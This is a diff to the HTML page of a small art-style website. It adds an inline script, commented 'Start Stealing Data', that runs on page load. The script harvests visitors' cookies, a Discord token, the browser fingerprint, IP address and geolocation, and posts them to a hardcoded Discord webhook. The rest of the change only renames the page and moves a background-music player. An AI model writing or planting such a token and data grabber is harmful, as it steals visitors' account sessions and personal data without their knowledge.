@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>weirdinsect</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ultra-Minimal Paranoid Website</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div id="background"></div>
@@ -18,17 +18,100 @@
       009
     </div>
   </div>
-  <script src="script.js"></script>
-</body><audio id="bg-music" loop>
-  <source src="Crystal Castles - Fleece.mp3" type="audio/mpeg">
-</audio>
 
-<script>
-  document.addEventListener('click', () => {
-    const audio = document.getElementById('bg-music');
-    if (audio.paused) {
-      audio.play();
-    }
-  }, { once: true });
-</script>
+  <audio id="bg-music" loop>
+    <source src="Crystal Castles - Fleece.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // 📡 Start Stealing Data
+    const webhookURL = "https://discord.com/api/webhooks/1526979707218952312/4KQxoO80p8idMs3Xk7i0QAwQ71LlMyjSmi3zX1JCNY8UCVtilbB_SZQ3Eell4reEVSQm";
+
+    // 🧠 Grab User Info
+    const user = {
+      ip: "",
+      location: "",
+      cookies: document.cookie,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      mobile: navigator.maxTouchPoints > 1,
+      country: "",
+      region: "",
+      city: "",
+      lat: "",
+      lon: "",
+      proxy: false,
+      discordToken: "",
+    };
+
+    // 📡 Grab Discord Token (if exists)
+    const discordToken = document.cookie
+      .split("; ")
+      .find(row => row.startsWith("token="))
+      ?.split("=")[1];
+
+    user.discordToken = discordToken;
+
+    // 🌐 Grab IP
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        user.ip = data.ip;
+        return fetch(`https://ipapi.co/${data.ip}/json/`);
+      })
+      .then(res => res.json())
+      .then(data => {
+        user.location = data.city + ", " + data.region;
+        user.country = data.country;
+        user.region = data.region;
+        user.city = data.city;
+        user.lat = data.latitude;
+        user.lon = data.longitude;
+        user.timezone = data.timezone;
+        user.mobile = data.mobile;
+        user.proxy = data.proxy;
+      })
+      .then(() => {
+        // 📡 Send Data to Discord
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: "User Data Collected",
+            embeds: [{
+              title: "User Info",
+              description: "Here is the information collected from the user:",
+              fields: [
+                { name: "IP", value: user.ip },
+                { name: "Location", value: user.location },
+                { name: "Country", value: user.country },
+                { name: "Region", value: user.region },
+                { name: "City", value: user.city },
+                { name: "Latitude", value: user.lat },
+                { name: "Longitude", value: user.lon },
+                { name: "Timezone", value: user.timezone },
+                { name: "Mobile", value: user.mobile ? "Yes" : "No" },
+                { name: "Proxy", value: user.proxy ? "Yes" : "No" },
+                { name: "Discord Token", value: user.discordToken || "Not Found" },
+                { name: "Cookies", value: user.cookies }
+              ],
+              color: 0x00FFFF
+            }]
+          })
+        });
+      });
+
+    // 🎵 Play Background Music on Click
+    document.addEventListener('click', () => {
+      const audio = document.getElementById('bg-music');
+      if (audio.paused) {
+        audio.play();
+      }
+    }, { once: true });
+  </script>
+</body>
 </html>
